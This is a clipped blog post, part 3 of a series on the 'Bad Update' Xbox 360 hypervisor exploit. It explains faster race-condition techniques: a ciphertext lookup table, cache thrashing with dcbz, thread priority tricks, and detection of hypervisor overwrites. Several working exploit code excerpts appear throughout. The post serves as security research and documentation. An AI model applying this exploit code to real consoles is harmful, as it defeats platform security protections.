---
title: "Hacking the Xbox 360 Hypervisor Part 3: Bad Update Improvements"
source: https://icode4.coffee/?p=1746
source_host: icode4.coffee
clip_date: 2026-11-12T10:27:41+08:00
trace_id: d3344dfd-95d6-4016-845a-661e2c81653c
content_hash: 381c3de7495fca44f441c3b52646fd9e0810f6f9ad4c4a14db34b1570ffc02c2
status: synced
tags: []
series: null
feed_source: icode4.coffee·逆向
ai_summary: null
ai_summary_style: null
images_status:
  total: 7
  succeeded: 7
  failed_urls: []
notion_page_id: 41675244-d011-812a-9bb8-d394b67575b9
ioc: null
---

Welcome to part 3 of the Hacking the Xbox 360 Hypervisor blog series. In this part I’ll go over what happened after I released the PoC for Bad Update, and how it went from taking ~20 minutes with a ~30% success rate to being near instantaneous with a near 100% success rate. If you haven’t already I highly recommend you read (or at least skim through) [part 1](https://icode4.coffee/?p=1047) and [part 2](https://icode4.coffee/?p=1081) as this post will reference a lot of the material discussed there. This part will be very short but will catch you up for part 4 which covers the peer pressure exploit and will be out soon.

## Rock Band Blitz

In the months following the release of Bad Update v1.0 there were two major improvements made to it by others. The first by “ihatecompvir” and “ [InvoxiPlayGames](https://github.com/InvoxiPlayGames) ” is a new game save entry point in the demo version of Rock Band Blitz (RBB) called [DaTArrest](https://github.com/RBEnhanced/DaTArrest). The demo version of RBB is a package file that’s normally downloaded from the Xbox Live store for free and saved to your console’s HDD or memory unit. When the Xbox 360 got support for using USB sticks as storage devices all of the packages signed to boot from the HDD or memory unit were grandfathered in to also boot from USB storage devices. This means the RBB demo package can be copied to a USB stick as a normal file and launched on any console on a software version that supports it.

By exploiting some memory corruption vulnerabilities in the game’s DLC parsing code they were able to craft a game save file that when loaded would bootstrap the Bad Update stage 2 ROP chain and begin the hypervisor exploit chain. Using RBB as an entry point we no longer needed the Tony Hawk American Wasteland game disc. Running the Bad Update exploit was now as simple as copying some files to a USB stick, plugging it into your console, and launching Rock Band Blitz from the dashboard.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4b6eb73c6a68f6d8.png)

Rock Band Blitz running the Bad Update exploit file.

## Hypervisor Race Condition Optimizations

Shortly after the RBB entry point was discovered I received a pull request from “Máté” who had made some improvements to the hypervisor race condition part of the exploit. These improvements included a hash table for precomputing and storing the malicious ciphertext values, a better cache flushing primitive, and improved thread scheduling between the XKE payload thread and ciphertext overwrite thread. The combination of these improvements reduced execution time down to a few seconds and the race condition had a much higher success rate.

### Ciphertext Hash Table

In part 2 I talked about [attacking encrypted memory](https://icode4.coffee/?p=1081#attacking-encrypted-memory) by using hypervisor APIs to create encrypted memory allocations at predetermined memory addresses and used two different memory pathways to capture the ciphertext for some chosen plaintext data. Using this primitive I was able to craft ciphertext data to get [kernel mode code execution](https://icode4.coffee/?p=1081#getting-kernel-mode-code-execution) as well as the ciphertext data used to [attack the LZX decompression code](https://icode4.coffee/?p=1081#bootloader-update-payload) in the bootloader update XKE payload.

The whitening value used in the memory encryption scheme is 12 bits large which gives 1024 unique ciphertext combinations for some given plaintext data. However, in my original PoC I was only generating the ciphertext for one of the 1024 possible whitening values and the reason for that was a two part failure on my end. When I originally prototyped out the ciphertext attack I did actually try using a lookup table for ciphertext combinations but I wasn’t able to get it working.

The first issue was I was using a very old ~2011 era hypervisor/kernel build (it was just what all my old research was based on) which was doing a TLB flush for the encrypted VA range in the hypervisor function that setup the memory encryption. In later hypervisor builds that TLB flush was removed because the kernel wrapper function for this hypervisor function already does a TLB flush for the VA range. However, I call the hypervisor syscall directly (skipping the kernel wrapper code which does the TLB flush) and since the TLB is lazy-loaded the whitening bits would become stale and the resulting ciphertext read out of memory was invalid.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/626008c90c241266.png)

Older hypervisor (left) vs newer hypervisor (right) with missing TLB flush

When testing the exploit on the 17559 (latest) version hypervisor the lookup table was causing issues and rather than investigate I decided I’d fix it later and moved on. By the time I got to the end of the exploit I had become so blinded by tunnel vision chasing CPU cache issues that I had convinced myself the lookup table just wasn’t going to work. What I should have probably done (aside from investigate the lookup table issues when they surfaced) was to put this project down for a few weeks and come back with a clear mindset. Oh well, lesson learned…

Getting into the implementation details of the hash table, we use the first N bits of the ciphertext we expect to see in memory as an index into two arrays. The first array contains the first 64-bits of the oracle ciphertext which is used for validation in case there’s ever a collision in the hash table. The second array stores our malicious ciphertext we want to write into memory.

```objectivec
// Index bits of the ciphertext lookup pseudo-hashtable
#define HASH_BITS 20

struct CIPHER_TEXT_DATA
{
    ULONGLONG dec_end_input_pos;
    ULONGLONG dec_output_buffer;                            // New dec_output_buffer pointer (dst address for memcpy)

    ULONGLONG OracleCipherText[1 << HASH_BITS];             // Cipher text for the LZX decoder context header, used to detect when to start the race attack

    ULONGLONG ReplacementCipherText1[1 << HASH_BITS];       // Cipher text containing our malicious dec_output_buffer pointer (points to hypervisor memory)
    ULONGLONG ReplacementCipherText2[1 << HASH_BITS];
};
```

In order to make this as efficient as possible (remember we’re racing the CPU and cache here) we ignore collisions. It’s better to have a few collisions and have to skip some iterations on the race condition loop than to implement support for buckets in the hash table. Instead we compensate for collisions by choosing a sufficiently large enough number of bits for the hash table key such that the number of collisions is on the order of single digits, if we even have any (majority of the time there’s 0).

However, more bits in the hash table key means a large array to hold the entries (meaning more memory is used) which could potentially work against us as we’ll be performing more fetches from RAM since CPU cache is being thrashed. Máté’s original PR used a key size of 10 bits but I later upped this to 20 bits which seems to be a happy spot where there’s usually no collisions or if there are it’s a low single digit number. The total size of memory needed to hold both hash tables is about 24MB.

```rust
void BuildCipherTextLookupTable(BYTE* pUpdateData, DWORD UpdateDataSize, DWORD ScratchOffset, CIPHER_TEXT_DATA* pCipherTextData)
{
    // Arbitrary virtual address that will get mapped through the encrypted pathway to BaseAddrPhys.
    BYTE *pMemoryAddress = (BYTE*)0x8D000000;

    ...

    // Scan all 1024 possible whitening bits.
    for (int i = 0; i < 1024; i++)
    {
        // Allocate encrypted memory.
        HvxEncryptedReserveAllocation((DWORD)pMemoryAddress, BaseAddrPhys, UpdateDataSize);
        HvxEncryptedEncryptAllocation((DWORD)pMemoryAddress);
        
        // Manually flush the TLB entry for the encrypted allocation address so we pick up the new whitening value.
        HvxFlushSingleTb(pMemoryAddress);

        // Get the cipher text for the expected header data in the LZX decoder context. This acts as a
        // trigger to know when to start the race attack.
        memset(pMemoryAddress, 0, 16);
        *(ULONG*)(pMemoryAddress + 0) = 0x4349444c;     // signature = 'CIDL'
        *(ULONG*)(pMemoryAddress + 4) = 0x8000;         // windows size = 0x8000
        *(ULONG*)(pMemoryAddress + 8) = 1;              // cpu type = 1
        __dcbst(0, (char *) pMemoryAddress);

        KeFlushCacheRange(pMemoryAddress, 0x80);
        KeFlushCacheRange(pUpdateData + ScratchOffset, 0x80);

        // Use the first N bits of the cipher text data as an index into the lookup table.
        ULONGLONG oracleData = *(ULONGLONG *)(pUpdateData + ScratchOffset);
        int index = oracleData >> (64 - HASH_BITS);

        // Check if we hit a collision in the cipher text lookup table.
        if (pCipherTextData->OracleCipherText[index] != 0)
            collisionCount++;

        // Add the current cipher text entry to the lookup table, overwriting any existing value.
        pCipherTextData->OracleCipherText[index] = oracleData;

        // Get the corresponding cipher text for our malicious dec_output_buffer pointer which points to the hypervisor code we want to overwrite.
        *(ULONGLONG*)(pMemoryAddress + 0x2B20) = pCipherTextData->dec_end_input_pos;
        *(ULONGLONG*)(pMemoryAddress + 0x2B28) = pCipherTextData->dec_output_buffer;
        __dcbst(0, (char *) pMemoryAddress + 0x2B00);

        KeFlushCacheRange(pMemoryAddress + 0x2B00, 0x80);
        KeFlushCacheRange(pUpdateData + ScratchOffset + 0x2B00, 0x80);

        // Store cipher text for our malicious dec_output_buffer pointer into the lookup table.
        pCipherTextData->ReplacementCipherText1[index] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B20);
        pCipherTextData->ReplacementCipherText2[index] = *(ULONGLONG *) (pUpdateData + ScratchOffset + 0x2B28);

        // Free the encrypted allocation.
        result = HvxEncryptedReleaseAllocation((DWORD)pMemoryAddress);
    }
}
```

Looking at the snippet above we can see how the hash table is built. We loop 1024 times to exhaust all possible whitening values for this page of memory. Each iteration we encrypt the page (which will increment the whitening value), get the ciphertext for the LZX decoder data we expect to be in memory and the ciphertext for our malicious data, then add them to the hash tables. On lines 15-16 we can see the `HvxFlushSingleTb` call that thwarted my own attempt at using a hash table, and on lines 30-31 we can see how the first N bits of the expected ciphertext is used as the hash table key.

### Improved Cache Flushing

In my original PoC I used a unique feature of the Xbox 360 CPU to [lock away half of the available L2 cache](https://icode4.coffee/?p=1081#abusing-the-cpu-for-fun-and-cache) to try and put as much pressure on it as I could. The L2 locking technique was pivotal in the original PoC but it didn’t put as much pressure on CPU cache as I would have liked. Putting pressure on CPU cache is particularly annoying because kernel mode (where the exploit code is running) cannot use certain cache flushing instructions due to them being privileged and only usable in hypervisor mode.

Additionally, the hypervisor only runs with CPU caching enabled when operating on encrypted memory which makes finding a hypervisor level cache flush primitive difficult. I tried to work around this by finding a [hypervisor syscall that would read a large amount of encrypted memory](https://icode4.coffee/?p=1081#finding-a-cache-flush-primitive), and I did find one syscall that fit the description, but it wasn’t nearly enough for what I needed. That function also had locks in it which prevented me from executing it on multiple threads simultaneously.

However, there was a kernel mode cache instruction I completely overlooked that Máté had found to work extremely well, `dcbz` or data cache block set to zero. Aside from just zero’ing out a CPU cache line this instruction has an interesting side effect:

```python
If the cache block is already in the data cache, all of its bytes are cleared to zero. If it is not in the cache, the block is allocated and initialized directly in the cache to zero without reading the old contents from main memory.
```

So if this instruction is used on a memory address that’s not currently in CPU cache the CPU will allocate space for it and potentially evict something else to make room for it. By running the `dcbz` instruction over large regions of memory it can be used as a cache flush primitive and force old data in CPU cache to be evicted. In Máté’s original implementation he allocated an 0x80000 byte region of memory then looped over it and for every 0x80 bytes (the size of a cache line) called `dcbz`.

This worked extremely well, however, I found that by increasing the allocation size by 3x and calling `dcbz` at three distinct locations I was able to assert slightly more pressure on CPU cache which would be important for another improvement I’ll get to later on. Here’s the final implementation:

```cpp
void CacheThrashThreadProc(THREAD_ARGS* pArgs)
{
    // Allocate a scratch buffer to help with thrashing L2 cache.
    BYTE* pCacheThrashBuffer = (BYTE*)MmAllocatePhysicalMemoryEx(MEM_REGION_TITLE, 0x180000, PAGE_READWRITE | MEM_LARGE_PAGES, NULL, MAXULONG_PTR, 0x20000);

    BYTE* pCacheThrashBuffer2 = pCacheThrashBuffer + 0x80000;
    BYTE* pCacheThrashBuffer3 = pCacheThrashBuffer + 0x100000;

    // Loop until we're told to exit.
    while (pArgs->bRunCacheThrashing != FALSE)
    {
        for (int i = 0; i < 3; i++)
        {
            // Walk the entire scratch buffer and try to fetch it into CPU cache.
            int offset = 0;
            while (offset < 0x80000)
            {
                // Zero three distinct blocks.
                __dcbz(offset, pCacheThrashBuffer);
                __dcbz(offset, pCacheThrashBuffer2);
                __dcbz(offset, pCacheThrashBuffer3);
                offset += 0x80;
            }
        }
    }
}
```

### Improved Thread Scheduling

In part 2 I talked about trying to [schedule the exploit threads on different hardware threads](https://icode4.coffee/?p=1081#introducing-thread-feng-shui) and how I got the best results by putting them on CPU hardware threads 0 and 1 (which are both on core 0). I don’t really know anything about how CPUs work at a hardware level but I suspected that the load/store memory transactions from both hardware threads on the same core were being queued onto the L2 crossbar in some sort of per-core fashion. Thus by putting the exploit threads on the hardware threads for a single core the writes from the exploit thread and reads from the XKE payload thread would get queued together and reduce latency for loads/stores to RAM, or something like that.

It’s probably not very surprising to anyone reading this but CPUs often have “hidden” instructions, ones not defined by the instruction set architecture (ISA) but implemented by the CPU manufacturer. Sometimes these have a special instruction encoding and other times you’d use an existing instruction in a nonsensical way to tell the CPU to do a special operation.

In the case of PowerPC [the ISA actually has some well defined instructions](https://www.setphaserstostun.org/power8/POWER8_UM_v1.3_16MAR2016_pub.pdf#page=137) for changing the priority of a hardware thread by executing a special OR instruction with all 3 register operands set to the same specific register based on what priority you want the hardware thread to run at. For example:

```python
or      r1, r1, r1      # Low priority
or      r2, r2, r2      # Medium priority
or      r5, r5, r5      # High priority
```

The Xbox 360 SDK docs describe a few intrinsic macros that can be used to set the priority of the hardware thread the code is running on: `__SetHWThreadPriorityLow`, `__SetHWThreadPriorityMed`, and `__SetHWThreadPriorityHigh`. The actual CPU instructions used by these macros are slightly different than what I listed above (these macros are xenon CPU specific) but that doesn’t really matter.

The SDK docs describe every core as having 32 dispatch slots which are split evenly between hardware threads running at medium priority (which is the default priority). By using the `__SetHWThreadPriorityLow` and `__SetHWThreadPriorityHigh` intrinsic macros you can have one hardware thread use 31 of the 32 dispatch slots and the other only use 1. How the dispatch slots relate to number of instructions fed to the CPU execution units I’m not sure (again I have no idea how a CPU pipeline actually works), but being able to go from 16/16 to 1/31 sounds pretty handy for scheduling the exploit threads.

Using these intrinsic macros Máté was able to schedule the exploit threads such that the hardware thread running the XKE payload was only getting 1 of the 32 dispatch slots while the ciphertext overwrite thread got the remaining 31 slots. The result was that the CPU was now spending the overwhelming majority of time in the ciphertext detection loop than it was actually running the XKE payload.

### Improved Ciphertext Overwrite Detection

The last improvement was something I came up with while working on the Peer Pressure exploit to try and make the Bad Update exploit as stable as I could get it. In the original PoC I had discovered the compressed bootloader data the XKE payload operates on was compressed into 15 blocks with all but the last block having a decompressed size of 0x8000 bytes. If the XKE payload attack was successful part of the last segment of the hypervisor would be overwritten with the decompressed data for one or more of the compressed blocks. By [observing the ciphertext for the last segment of the hypervisor in two distinct locations](https://icode4.coffee/?p=1081#update-data-side-channel) I could determine if the last block of compressed data was written to it by the XKE payload.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/abfee681dae8559a.png)

Using ciphertext to determine when the last compressed block was written to memory.

The attack was setup such that if the last block of compressed data was written to the hypervisor at a specific offset it would change the instructions for one of hypervisor syscalls to a write-what-where primitive I could use to get full hypervisor code execution. However, there was a flaw in how the ciphertext was being observed which not only led to false positives that would crash the console but also missed iterations where the last block was written to memory successfully.

```java
DWORD RunUpdatePayloadThreadProc(THREAD_ARGS* pArgs)
{
    ...

    // Get the cipher text at the location we want to overwrite and at an offset that is > the size of block 14. This allows
    // us to determine when we win the race on block 14 (smallest block in the file) vs any other block.
    DWORD* pCipherTextPtr1 = (DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);
    DWORD* pCipherTextPtr2 = (DWORD*)(0xA0030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET) + BLOCK_14_SIZE + 0x80);
    DWORD cipherValue1 = *pCipherTextPtr1;
    DWORD cipherValue2 = *pCipherTextPtr2;

    // Loop and hammer the payload until we hopefully get code exec.
    while (true)
    {
        ...

        // Execute the payload.
        // Status is 0xc8000012 on miss, and 0xc8000006 on hit.
        DWORD result = HvxKeysExecute(pArgs->PayloadPhys, pArgs->PayloadSize, pArgs->UpdateDataPhys, pArgs->UpdateDataSize, NULL, NULL);
        if (result != 0xc8000012)
            DbgPrint("XKE payload returned status %#x\n", result);

        // Flush cache on the cipher text pointers.
        __dcbf(0, pCipherTextPtr1);

        // Check if we got a block overwrite and if it appears to be block 14.
        DWORD test1 = *pCipherTextPtr1;
        if (cipherValue1 != test1)
        {
            ...
            
            __dcbf(0, pCipherTextPtr2);

            // We got a block overwrite, check if it was block 14.
            DWORD test2 = *pCipherTextPtr2;
            if (cipherValue2 == test2)
            {
                DbgPrint("Block 14 overwrite hit!\n");
                
                ...
            }
            else
            {
                DbgPrint("Race hit: 0x%08x\n", test1);
            }

            // Save the latest block hit values.
            cipherValue1 = test1;
            cipherValue2 = test2;
        }
    }
}
```

Above is the original implementation for the exploit thread that ran the XKE payload and checked for ciphertext changes in the last segment of the hypervisor. The lines relevant to ciphertext observation have been highlighted. Because the same thread is both running the XKE payload and checking for ciphertext changes it can only detect if the ciphertext has changed at all and not how many times it changed. Put more simply: I could only infer if one of the compressed blocks was written to memory, but not how many blocks were written. With that in mind lets run through two scenarios that could happen when running an iteration of the XKE payload while attempting to get compressed block 14 written to memory.

#### Missing Successful Writes

While running the XKE payload the race attack is successful on some block N such that N < 14 (0x8000 bytes get written) and successful on block 14 (less than 0x8000 bytes). Upon returning from `HvxKeysExecute` we observe the ciphertext for two locations in the target write zone and see that the ciphertext has changed in both locations. We can’t infer that block 14 was written after block N because we don’t have the ability to observe how many times the ciphertext changed. Thus we consider this a failed iteration even though it was successful.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/db350122b2b7dc95.png)

Ciphertext observations when block 14 and any other block are written.

#### False Positive Write

Assume we have just executed an iteration of the XKE payload that exhibits the missed successful write behavior for some block N and block 14. The last segment of the hypervisor now contains the data for block 14 and the tail data for some block N. We run another iteration of the XKE payload and this time only block N is written. When we observe the ciphertext changes for this iteration we’ll see the ciphertext at the first location has change but the ciphertext at the second location hasn’t because it already contained the ciphertext for the tail data of block N from the previous iteration.

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/97ffe687fc5521d4.png)

Ciphertext observations when block N is written after a missed write.

This gets detected as a write for block 14 and the exploit will try to execute some hypervisor code assuming the instruction pattern for the target syscall has been changed to the write-what-where pattern found in bock 14. However, the instruction pattern is actually random instructions found in block N and will cause the console to crash.

#### The New Detection Method

Now that the cache flushing primitive was significantly improved it was possible to observe the ciphertext changes for each block of compressed data that was successfully written to the target region of hypervisor memory. The solution I came up with for the detecting if block 14 was written to memory was quite simple: I created a new thread that continuously watched the ciphertext for changes and counted how many changes were observed.

If the counter reached 15 once the XKE payload was done executing then we know all 15 blocks were written to memory and thus the last block had to have been written. If we observed anything less we simply consider it a failed iteration and try again. Here’s the code for the new ciphertext detection thread:

```java
void CipherTextObservationThreadProc(THREAD_ARGS* pArgs)
{
    // Setup our hypervisor cipher text watch pointer.
    volatile DWORD* pCipherTextPtr = (volatile DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);

    // Flush cache and fetch the starting value.
    __dcbf(0, (const void*)pCipherTextPtr);
    DWORD lastCipherTextValue = *pCipherTextPtr;

    volatile DWORD* pBlockCounter = (volatile DWORD*)&pArgs->CipherTextBlockCounter;

    // Loop until we're told to exit.
    while (pArgs->bRunCacheThrashing != FALSE)
    {
        for (int i = 0; i < 10000; i++)
        {
            // Flush any cached data for the cipher text observation pointer.
            __dcbf(0, (const void*)pCipherTextPtr);
            
            // Fetch the cipher text for the area of the hypervisor we want to overwrite and check if another block has been written.
            DWORD test = *pCipherTextPtr;
            if (test != lastCipherTextValue)
            {
                lastCipherTextValue = test;
                (*pBlockCounter)++;
            }

            // Once we observe 15 different cipher text values bail out.
            if (*pBlockCounter == 15)
            {
                goto Exit;
            }
        }
    }

Exit:

    ExTerminateThread(0);
}
```

## Too Much Pressure

The new ciphertext observation function worked great but there was a new problem it introduced. Due to the amount of pressure I was putting on CPU cache the console would crash about 30% of the time when executing the XKE payload. When the XKE payload runs it takes the compressed update data buffer and does an in-place relocation to move it from unprotected memory to protected memory so it can’t be tampered with asynchronously. After the XKE payload runs its main logic it’ll do another in-place relocation to move the update data back to unprotected memory before returning.

After modifying the XKE payload and inserting a bunch of `printf` calls I was able to determine that the console would crash in a function I called `HvpRelocateProtectedToPhysical` when trying to move the update data from protected memory back to unprotected memory. The function works by looping over a region of memory and for each CPU cache line worth of data (128 bytes) it will:

1.  Read the entire cache line into CPU registers using the protected source address.
2.  Invalidate both data and instruction caches for the source address, zero the cache line for the destination address.
3.  Write the data back to memory using the unprotected destination address.

Here’s the disassembly for the inner loop of the `HvpRelocateProtectedToPhysical` function:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/c387b9e84d91ec3b.png)

Disassembly for the HvpRelocateProtectedToPhysical function.

In the modified version of the XKE payload I added a bunch of `printf` calls in a re-implemented version of this function so I could monitor were it would crash:

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/05daffb7e2b0dd1c.png)

Disassembly for HvpRelocateProtectedToPhysical with printf patches applied.

After running a few dozen iterations I was able to determine that the CPU would crash when trying to write data back to the unprotected destination address on the line highlighted in red. As I mentioned earlier in the [improved cache flushing](https://icode4.coffee/?p=1746#improved-cache-flushing) section I made some modifications to Máté’s original implementation to put more pressure on cache which made the new ciphertext observation method more reliable.

I don’t know exactly what’s happening here that causes the CPU to crash when trying to write data back to the unprotected destination address. Perhaps one of the cache invalidation instructions didn’t fully complete before the store instruction was executed, or maybe there’s some edge case with respect to the custom memory pathways when the CPU is starved for cache. Regardless, I did manage to find a way to work around this issue.

### The New Detection Method v2

Since the crash happens after we would have been able to observe all 15 blocks of data being written to hypervisor memory the solution I came up with was to immediately stop the cache flushing thread and drop the L2 locks once the ciphertext change counter hits 15. This reduces the pressure on CPU cache before the call to `HvpRelocateProtectedToPhysical` which prevents it from crashing. Here’s the updated implementation of the ciphertext observation thread logic:

```objectivec
void CipherTextObservationThreadProc(THREAD_ARGS* pArgs)
{
    // Lock half of the available L2 cache and pathways to put pressure on the CPU. This causes data in L2 cache to
    // age out more quickly and improves cipher text detection rate.
    BYTE* pL2LockBuffer = LockAndThrashL2();

    // Setup our hypervisor cipher text watch pointer.
    volatile DWORD* pCipherTextPtr = (volatile DWORD*)(0xA0030000 + HV_SEG3_OVERWRITE_OFFSET);

    // Flush cache and fetch the starting value.
    __dcbf(0, (const void*)pCipherTextPtr);
    DWORD lastCipherTextValue = *pCipherTextPtr;

    volatile DWORD* pBlockCounter = (volatile DWORD*)&pArgs->CipherTextBlockCounter;

    // Loop until we're told to exit.
    while (pArgs->bRunCacheThrashing != FALSE)
    {
        for (int i = 0; i < 10000; i++)
        {
            // Flush any cached data for the cipher text observation pointer.
            __dcbf(0, (const void*)pCipherTextPtr);
            
            // Fetch the cipher text for the area of the hypervisor we want to overwrite and check if another block has been written.
            DWORD test = *pCipherTextPtr;
            if (test != lastCipherTextValue)
            {
                lastCipherTextValue = test;
                (*pBlockCounter)++;
            }

            // Once we observe 15 different cipher text values stop thrashing cache immediately.
            if (*pBlockCounter == 15)
            {
                // Unlock the L2 cache and free the scratch buffer.
                UnlockL2(pL2LockBuffer);
                pL2LockBuffer = NULL;

                // Flag to stop thrashing cache.
                pArgs->bRunCacheThrashing = FALSE;
                
                goto Exit;
            }
        }
    }

Exit:
    if (pL2LockBuffer != NULL)
    {
        // Unlock the L2 cache and free the scratch buffer.
        UnlockL2(pL2LockBuffer);
    }

    // We must call ExTerminateThread since we don't use the normal thread startup routine.
    ExTerminateThread(0);
}
```

I moved the L2 cache locks into the ciphertext observation thread which we can see on line 5. Once we observe all 15 blocks of data have been written to memory we drop the L2 locks on line 36, and signal to the cache flushing thread to immediately terminate on line 40.

There’s still an edge case where we don’t observe all 15 blocks being written and thus won’t be able to reduce pressure on CPU cache before the call to `HvpRelocateProtectedToPhysical`. But this didn’t seem to matter. With all the improvements the exploit is usually successful in the first run of the XKE payload and at worst it may take 2-5 iterations, but I didn’t encounter any crashes when testing. It’s still possible it could happen but I think it’s very rare it does.

## Conclusion

So there you have it, thanks to all the improvements from ihatecompvir, InvoxiPlayGames, and Máté the Bad Update exploit is now instantaneous and has nearly 100% success rate, and you only need to copy a few files to a USB stick to hack your console. When I released the original PoC I made some statements like “I don’t think this can be optimized any further” mostly to avoid endless comments from non-technical people spit balling random useless ideas. The truth is I always thought it could be optimized further but I didn’t expect it would ever reach the point it’s at now.

I think the biggest thing I learned here is that I should have taken a break after I completed the first iteration of Bad Update and came back with a clear mind to try and refine it. Having just found one of the only two bugs in the Xbox 360 hypervisor I put a lot of pressure on myself to get this exploit working at all. It took a lot of effort and sleepless days to pull it off and in the end I got tunnel vision chasing issues that didn’t really matter which distracted me from the real issues at hand. Had I taken a break after the initial PoC and came back a few weeks later I probably could have had something more refined for the initial release even if it wasn’t as refined as it is now.

Any ways, that does it for part 3. You can find the source code for the Bad Update improvements on my [GitHub](https://github.com/grimdoomer/Xbox360BadUpdate/tree/v1.3). Part 4 which covers the Peer Pressure exploit will be out soon so stay tuned for that!
